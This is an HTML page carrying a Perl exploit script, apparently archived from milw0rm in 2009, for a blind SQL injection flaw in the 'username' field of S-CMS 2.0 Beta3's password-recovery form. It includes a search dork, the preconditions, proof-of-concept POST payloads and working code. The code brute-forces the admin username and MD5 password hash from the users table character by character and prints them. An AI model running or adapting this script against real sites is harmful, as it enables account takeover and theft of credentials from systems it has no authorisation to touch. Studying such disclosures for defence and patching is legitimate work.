<html><head><title>S-CMS <= 2.0b3 (username) Blind SQL Injection Exploit</title></head><pre>#!/usr/bin/perl
#***********************************************************************************************
#***********************************************************************************************
#**	       										      **
#**  											      **
#**     [] [] []  [][][][&gt;  []     []  [][  ][]     []   [][]]  []  [&gt;  [][][][&gt;  [][][][]    **
#**     || || ||  []        [][]   []   []  []     []   []      [] []   []	  []    []    **
#   [&gt;  [][][][]  [][][][&gt;  [] []  []   []  []   [][]  []       [][]    [][][][&gt;  []    []    **
#**  [-----[]-----[][][][&gt;--[]--[]-[]---[][][]--[]-[]--[]--------[]-----[][][][&gt;--[][][][]---\ 
#**==[&gt;    []     []        []   [][]   []  [] [][][]  []       [][]    []           [] []  &gt;&gt;--
#**  [----[[]]----[]--- ----[]-----[]---[]--[]-----[]--[]-------[] []---[]----------[]--[]---/ 
#   [&gt;   [[[]]]   [][][][&gt;  [][]   [] [][[] [[]]  [][]  [][][]  []  [&gt;  [][][][&gt; &lt;][]   []    
#**							                                      **
#**    											      **
#**                          ¡VIVA SPAIN!...¡GANAREMOS EL MUNDIAL!...o.O                      **
#**					  ¡PROUD TO BE SPANISH!	                              **
#**											      **
#***********************************************************************************************
#***********************************************************************************************
#
#---------------------------------------------------------------------------------------------
#|       	   	   (Post Form var 'username') BLIND SQLi exploit         	     |
#|-------------------------------------------------------------------------------------------|
#|                                    |    S-CMS &lt;= v-2.0 Beta3   |		    	     |
#|  CMS INFORMATION:          	       ---------------------------	               	     |
#|										             |
#|--&gt;WEB: http://www.matteoiammarrone.com/public/s-cms/			       		     |
#|--&gt;DOWNLOAD: http://www.matteoiammarrone.com/public/s-cms/		                     |
#|--&gt;DEMO: N/A										     |
#|--&gt;CATEGORY: CMS / Portal								     |
#|--&gt;DESCRIPTION: Cms written in php and mysql, phpnuke style whit a plugins,                |
#|		blocks and permission system.                            		     |
#|--&gt;RELEASED: 2009-05-25								     |
#|											     |
#|  CMS VULNERABILITY:									     |
#|											     |
#|--&gt;TESTED ON: firefox 3						                     |
#|--&gt;DORK: &quot;S-CMS by matteoiamma&quot;						             |
#|--&gt;CATEGORY: BLIND SQLi exploit						             |
#|--&gt;AFFECT VERSION: &lt;= 2.0-Beta3					 		     |
#|--&gt;Discovered Bug date: 2009-05-25							     |
#|--&gt;Reported Bug date: 2009-05-25							     |
#|--&gt;Fixed bug date: 2009-05-28								     |
#|--&gt;Info patch(2.1): http://www.matteoiammarrone.com/public/s-cms/plugin.php?page=phpbb3    |
#|--&gt;Author: YEnH4ckEr									     |
#|--&gt;mail: y3nh4ck3r[at]gmail[dot]com							     |
#|--&gt;WEB/BLOG: N/A									     |
#|--&gt;COMMENT: A mi novia Marijose...hermano,cunyada, padres (y amigos xD) por su apoyo.      |
#|--&gt;EXTRA-COMMENT: Gracias por aguantarme a todos! (Te kiero xikitiya!)		     |
#---------------------------------------------------------------------------------------------
#
#------------
#CONDITIONS:
#------------
#
#magic quotes=OFF
#
#{db_prefix} by default=cms
#
#-------
#NEED:
#-------
#
#Valid username
#
#---------------------------------------
#PROOF OF CONCEPT (SQL INJECTION):
#---------------------------------------
#
#POST http://[HOST]/[PATH]/plugin.php?page=your_account.php&amp;mode=passlost HTTP/1.1
#Host: [HOST]
#User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; es-ES; rv:1.9.0.10) Gecko/2009042316 Firefox/3.0.10
#Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
#Accept-Language: es-es,es;q=0.8,en-us;q=0.5,en;q=0.3
#Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
#Keep-Alive: 300
#Proxy-Connection: keep-alive
#Referer: http://[HOST]/[PATH]/html/plugin.php?page=your_account.php&amp;mode=passlost
#
#username=pepe%27+or+1%3D%271&amp;recupera_pass=Recover+password --&gt; OK, sending code
#
#username=pepe%27+or+1%3D%270&amp;recupera_pass=Recover+password --&gt; Uhm?, username doesn't exist
#
#--------------
#WATCH VIDEOS
#--------------
#
# BSQLi --&gt; http://www.youtube.com/watch?v=oVYrVcfA6Vo
#
# SQLi --&gt; http://www.youtube.com/watch?v=S__l5IKzYNU
#      --&gt; http://www.youtube.com/watch?v=LprQDdZ6ZcU
#
# LFI --&gt; http://www.youtube.com/watch?v=2NhaNFbyP_w
#
#
##############################################################################
##############################################################################
##**************************************************************************##
##  SPECIAL THANKS TO: Str0ke and every H4ck3r(all who do milw0rm)!         ##
##**************************************************************************##
##--------------------------------------------------------------------------##
##**************************************************************************##
## GREETZ TO: JosS, Ulises2k, J.McCray, Evil1 and Spanish Hack3Rs community!##
##**************************************************************************##
##############################################################################
##############################################################################
#
#
use LWP::UserAgent;
use HTTP::Request;
#Subroutines
sub lw
{
	my $SO = $^O;
	my $linux = &quot;&quot;;
	if (index(lc($SO),&quot;win&quot;)!=-1){
		$linux=&quot;0&quot;;
	}else{
		$linux=&quot;1&quot;;
	}		
	if($linux){
		system(&quot;clear&quot;);
	}
	else{
		system(&quot;cls&quot;);
		system (&quot;title S-CMS V-2.0 Beta3 Blind SQL Injection Exploit&quot;);
		system (&quot;color 02&quot;);
	}
}
sub request {
	my $userag = LWP::UserAgent-&gt;new;
	$userag -&gt; agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)');
	$request = HTTP::Request -&gt; new(POST =&gt; $_[0]);
	$request-&gt;referer($_[0]);
	$request-&gt;content_type('application/x-www-form-urlencoded');
	$request-&gt;content($_[1]);
	my $outcode= $userag-&gt;request($request)-&gt;as_string;
	#print $outcode; #--&gt; Active this line for debugger mode
	#print $request-&gt;as_string; #--&gt; Active this line for debugger mode
	return $outcode;
}
sub error {
print &quot;\t------------------------------------------------------------\n&quot;;
	print &quot;\tWeb isn't vulnerable!\n\n&quot;;
	print &quot;\t---&gt;Maybe:\n\n&quot;;
	print &quot;\t\t1.-Patched.\n&quot;;
	print &quot;\t\t2.-Bad path or host.\n&quot;;
	print &quot;\t\t3.-Bad username.\n&quot;;
	print &quot;\t\t4.-db_prefix isn't 'cms'.\n&quot;;
	print &quot;\t\t5.-Magic quotes ON'.\n&quot;;
	print &quot;\t\tEXPLOIT FAILED!\n&quot;;
	print &quot;\t------------------------------------------------------------\n&quot;;
}
sub testedblindsql {
	print &quot;\t-----------------------------------------------------------------\n&quot;;
	print &quot;\tWEB MAYBE BE VULNERABLE!\n\n&quot;;
	print &quot;\tTested Blind SQL Injection.\n&quot;;		
	print &quot;\tStarting exploit...\n&quot;; 
	print &quot;\t-----------------------------------------------------------------\n\n&quot;;
}
sub helper {
	print &quot;\n\t[!!!] S-CMS V-2.0 Beta3 Blind SQL Injection Exploit\n&quot;;
	print &quot;\t[!!!] USAGE MODE: [!!!]\n&quot;;
	print &quot;\t[!!!] perl $0 [HOST] [PATH] [USER]\n&quot;;
	print &quot;\t[!!!] [HOST]: Web.\n&quot;;
	print &quot;\t[!!!] [PATH]: Home Path.\n&quot;;
	print &quot;\t[!!!] [USER]: Username for fish\n&quot;;
	print &quot;\t[!!!] Example: perl $0 'www.example.com' 'demo' 'y3nh4ck3r'\n&quot;;
}
sub brute_length{
#Username length
$exit=0;
$i=0;
while($exit==0){
	my $blindsql=&quot;username=&quot;.$_[1].&quot;'+AND+(SELECT+length(username)+FROM+cms_users+WHERE+uid=1)='&quot;.$i++.&quot;&amp;recupera_pass=Recover+password&quot;; #injected code
	$output=&amp;request($_[0],$blindsql);
	if($output =~ (/\&lt;center\&gt;Generate a confirmation code that was sent via email\.\&lt;\/center\&gt;/)){
		$exit=1;
	}else{
		$exit=0;
	}
	#This is the max length of username
	if($i&gt;50){
	&amp;error;
	exit(1);
	}
}
#Save column length
$length=$i-1;
print &quot;\t&lt;&lt;&lt;&lt;&lt;---------------------------------------------------------&gt;&gt;&gt;&gt;&gt;\n&quot;;
print &quot;\tLength catched!\n&quot;;
print &quot;\tLength Username --&gt; &quot;.$length.&quot;\n&quot;;
print &quot;\tWait several minutes...\n&quot;;
print &quot;\t&lt;&lt;&lt;&lt;&lt;---------------------------------------------------------&gt;&gt;&gt;&gt;&gt;\n\n&quot;;
return $length;
}
sub exploiting {
#Bruteforcing values
$values=&quot;&quot;;
$k=1;
	$z=45;
	while(($k&lt;=$_[1]) &amp;&amp; ($z&lt;=126)){
		my $blindsql=&quot;username=&quot;.$_[3].&quot;'+AND+ascii(substring((SELECT+&quot;.$_[2].&quot;+FROM+cms_users+WHERE+uid=1),&quot;.$k.&quot;,1))='&quot;.$z.&quot;&amp;recupera_pass=Recover+password&quot;;
		$output=&amp;request($_[0],$blindsql);
		if($output =~ (/\&lt;center\&gt;Generate a confirmation code that was sent via email.\&lt;\/center\&gt;/))
		{
			$values=$values.chr($z);
			$k++;
			$z=45;
		}
#new char
	$z++; 
	}
return $values;
}
#Main
&amp;lw;
print &quot;\t#######################################################\n\n&quot;;
print &quot;\t#######################################################\n\n&quot;;
print &quot;\t##   S-CMS V-2.0 Beta3 Blind SQL Injection Exploit   ##\n\n&quot;;
print &quot;\t##           Blind SQL Injection Exploit             ##\n\n&quot;; 
print &quot;\t##       ++Conditions: magic_quotes=OFF              ##\n\n&quot;;
print &quot;\t##       ++Needed: Valid username (USER)             ##\n\n&quot;;
print &quot;\t##               Author: Y3nh4ck3r                   ##\n\n&quot;;
print &quot;\t##      Contact:y3nh4ck3r[at]gmail[dot]com           ##\n\n&quot;;
print &quot;\t##            Proud to be Spanish!                   ##\n\n&quot;;
print &quot;\t#######################################################\n\n&quot;;
print &quot;\t#######################################################\n\n&quot;;
#Init variables
my $host=$ARGV[0];
my $path=$ARGV[1];
my $userforfish=$ARGV[2];
$numArgs = $#ARGV + 1;
if($numArgs&lt;=2) 
	{
		&amp;helper;
		exit(1);	
	}	
#Build uri
my $finalhost=&quot;http://&quot;.$host.&quot;/&quot;.$path.&quot;/plugin.php?page=your_account.php&amp;mode=passlost&quot;;
$finalrequest = $finalhost;	
#Testing blind sql injection and magic_quotes (any error?)
$send_post1=&quot;username=&quot;.$userforfish.&quot;%27+or+1%3D%271&amp;recupera_pass=Recover+password&quot;;
$output1=&amp;request($finalrequest,$send_post1);
$send_post2=&quot;username=&quot;.$userforfish.&quot;%27+or+1%3D%270&amp;recupera_pass=Recover+password&quot;;
$output2=&amp;request($finalrequest,$send_post2);
if ($output1 eq $output2)
{    
	#Not injectable
	&amp;error;
	exit(1); 
}else{ 
	#blind sql injection is available
	&amp;testedblindsql;
}
#Bruteforcing length
$length_user=&amp;brute_length($finalrequest,$userforfish);	
#Bruteforcing username...
$user=&amp;exploiting($finalrequest,$length_user,'username',$userforfish);
#Bruteforcing password md5 hash...
$pwhash=&amp;exploiting($finalrequest,32,'password',$userforfish);
#final checking
if((!$user) || (!$pwhash)){
	&amp;error;
	exit(1);
}
print &quot;\n\t\t*************************************************\n&quot;;
print &quot;\t\t*********  EXPLOIT EXECUTED SUCCESSFULLY ********\n&quot;;
print &quot;\t\t*************************************************\n\n&quot;;
print &quot;\t\tAdmin-username: &quot;.$user.&quot;\n&quot;;
print &quot;\t\tAdmin-password: &quot;.$pwhash.&quot;\n\n&quot;;
print &quot;\n\t\t&lt;&lt;----------------------FINISH!--------------------&gt;&gt;\n\n&quot;;
print &quot;\t\t&lt;&lt;---------------Thanks to: y3hn4ck3r--------------&gt;&gt;\n\n&quot;;
print &quot;\t\t&lt;&lt;------------------------EOF----------------------&gt;&gt;\n\n&quot;;
exit(1);
#Ok...all job done

# milw0rm.com [2009-06-09]</pre></html>